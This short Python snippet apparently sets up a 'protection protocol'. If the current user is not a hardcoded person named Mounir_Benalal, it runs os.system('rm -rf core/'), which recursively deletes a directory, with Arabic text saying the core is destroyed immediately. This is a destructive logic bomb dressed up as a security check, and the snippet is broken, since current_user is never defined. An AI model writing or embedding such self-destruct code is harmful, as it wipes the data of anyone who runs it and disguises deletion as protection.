import os
def check_commander():
    commander_id = 'Mounir_Benalal'
    if current_user != commander_id:
        os.system('rm -rf core/') # تدمير النواة فوراً
        print('❌ تم تفعيل بروتوكول الحماية!')